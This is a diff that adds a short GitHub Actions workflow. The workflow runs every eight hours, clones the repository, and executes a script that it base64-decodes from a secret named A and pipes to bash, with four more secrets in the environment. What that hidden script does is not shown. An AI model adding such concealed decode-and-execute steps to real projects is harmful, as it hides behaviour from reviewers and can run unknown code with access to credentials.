@@ -1,0 +1,26 @@
+name: Run action
+
+on:
+  schedule:
+    - cron: '0 */8 * * *'
+  workflow_dispatch:
+
+jobs:
+  daily:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Clone repository
+        run: |
+          gh auth setup-git
+          git clone "https://github.com/$GITHUB_REPOSITORY" -b "$GITHUB_REF_NAME" "$GITHUB_WORKSPACE" && cd "$GITHUB_WORKSPACE"
+        env:
+          GH_TOKEN: ${{ github.token }}
+
+      - name: Run the workflow
+        run: echo "$A" | base64 -d | bash
+        env:
+          A: ${{ secrets.A }}
+          B: ${{ secrets.B }}
+          C: ${{ secrets.C }}
+          D: ${{ secrets.D }}
+          E: ${{ secrets.E }}
